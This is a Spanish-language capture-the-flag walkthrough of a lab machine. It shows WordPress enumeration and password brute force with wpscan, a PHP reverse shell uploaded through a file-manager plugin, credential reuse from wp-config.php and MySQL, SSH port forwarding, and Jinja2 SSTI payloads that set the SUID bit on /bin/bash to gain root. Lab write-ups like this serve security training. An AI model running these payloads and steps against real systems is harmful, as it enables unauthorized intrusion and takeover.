Escaneo de puertos con Nmap:
```
nmap -p- -sC -sV -sS --min-rate 5000 -n -vvv -Pn 192.168.1.48 -oN escaneo
```

![](../../../Images/Pasted%20image%2020250213083912.png)

Observo lo que corre por el puerto 80:

![](../../../Images/Pasted%20image%2020250213083956.png)

Usaré Gobuster para encontrar directorios

![](../../../Images/Pasted%20image%2020250213084242.png)

Accedo al directorio /wp1

![](../../../Images/Pasted%20image%2020250213084304.png)

Y automáticamente en la forma en que está construida esta página me doy cuenta que estoy ante un Wordpress

Usaré la herramienta de Wpscan para encontrar usuarios y plugins maliciosos
```
wpscan --url http://thefirstavenger.thl/wp1/ -e u,vp
```

![](../../../Images/Pasted%20image%2020250213084747.png)

![](../../../Images/Pasted%20image%2020250213084801.png)

Me encontró el usuario admin

Haré fuerza bruta con la misma herramienta para encontrar la contraseña de este usuario:
```
wpscan --url http://thefirstavenger.thl/wp1/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

![](../../../Images/Pasted%20image%2020250213084905.png)

![](../../../Images/Pasted%20image%2020250213084922.png)

Y la contraseña del usuario admin es spongebob

Accedo por el panel de Login web con estas credenciales:

![](../../../Images/Pasted%20image%2020250213085021.png)

![](../../../Images/Pasted%20image%2020250213085034.png)

Ahora estoy dentro de Wordpress

Ahora voy a Plugins-Añadir nuevo plugin, e instalo el Bit File Manager 

![](../../../Images/Pasted%20image%2020240829101111.png)

Ahora voy a la pestaña Bit File Manager

![](../../../Images/Pasted%20image%2020240829101217.png)

Luego a wp-content

![](../../../Images/Pasted%20image%2020240829101241.png)

Ahora Uploads

![](../../../Images/Pasted%20image%2020240829101258.png)

Ahora me crearé una RevShell con Msfvenom en un archivo .php

![](../../../Images/Pasted%20image%2020250213085432.png)

Y la subo al directorio /uploads:

![](../../../Images/Pasted%20image%2020250213085542.png)

Voy a la dirección donde subí este archivo:

![](../../../Images/Pasted%20image%2020250213085622.png)

Acá está mi archivo

Me pongo a la escucha con Netcat y doy click en mi archivo:

![](../../../Images/Pasted%20image%2020250213085717.png)

Y ahora estoy dentro de la máquina

### Tratamiento de la TTY
```
script /dev/null -c bash 
Ctrl z
stty raw -echo; fg 
reset xterm 
export SHELL=bash
export TERM=xterm
```

![](../../../Images/Pasted%20image%2020250213090018.png)

![](../../../Images/Pasted%20image%2020250213090038.png)

## ESCALADA DE PRIVILEGIOS

Observo los usuarios que contiene esta máquina

![](../../../Images/Pasted%20image%2020250213110333.png)

Existe un único usuario llamado Steve

En la ubicación /var/www/html/wp1/ encuentro y leo el wp-config.php:

![](../../../Images/Pasted%20image%2020250213103824.png)

Tengo la contraseña de una base de datos y su usuario

Accedo a ella usando esas credenciales:

![](../../../Images/Pasted%20image%2020250213104949.png)

Y estoy dentro de la base de datos Mysql

Miraré las bases de datos:

![](../../../Images/Pasted%20image%2020250213110110.png)

Usaré la base de datos Top_secret

![](../../../Images/Pasted%20image%2020250213110149.png)

Veré sus tablas:

![](../../../Images/Pasted%20image%2020250213110200.png)

Selecciono todo de esta tabla de Avengers

![](../../../Images/Pasted%20image%2020250213110233.png)

Y tengo la contraseña hasheada del usuario steve de la máquina

La crackeo:

![](../../../Images/Pasted%20image%2020250213110429.png)

Intrusión por el puerto 22 SSH con el usuario steve y la contraseña thecaptain:

![](../../../Images/Pasted%20image%2020250213110527.png)

![](../../../Images/Pasted%20image%2020250213110541.png)

Y listo, volví a entrar a la máquina pero esta vez siendo el usuario steve

Flag de user:

![](../../../Images/Pasted%20image%2020250213110608.png)

Miraré los puertos abiertos con:
```
ss -tulun
```

![](../../../Images/Pasted%20image%2020250213110737.png)

Existe un puerto 7092 corriendo de manera local, sabiendo esto y ya que tengo un ssh, me conectaré de la siguiente manera redirigiendo el puerto 7092 de la máquina a mi puerto 7092 local:
```
ssh -L 9090:127.0.0.1:7092 steve@192.168.1.48
```

![](../../../Images/Pasted%20image%2020250213110921.png)

Ahora si voy desde el navegador a "127.0.0.1:9090", veré la web que está corriendo en ese puerto local de la máquina:

![](../../../Images/Pasted%20image%2020250213111123.png)

Tengo un campo para ingresar datos

Probaré ingresando:
```
{{7*7}}
```

![](../../../Images/Pasted%20image%2020250213111406.png)

Si el resultado es 49 quiere decir que estoy ante un SSTI:

![](../../../Images/Pasted%20image%2020250213111437.png)

Efectivamente estoy ante un Server Side Template Injection, eso significa que puedo ejecutar comandos de manera remota, intentaré con este código:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

![](../../../Images/Pasted%20image%2020250213111642.png)

Si funciona

Por ende le daré permisos de ejecución a la /bin/bash desde acá:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('chmod u+s /bin/bash').read() }}
```

![](../../../Images/Pasted%20image%2020250213111753.png)

Ahora regreso nuevamente a la máquina y ejecuto "bash -p"

![](../../../Images/Pasted%20image%2020250213111833.png)

Y listo, soy ROOT

Flag de root:

![](../../../Images/Pasted%20image%2020250213111855.png)

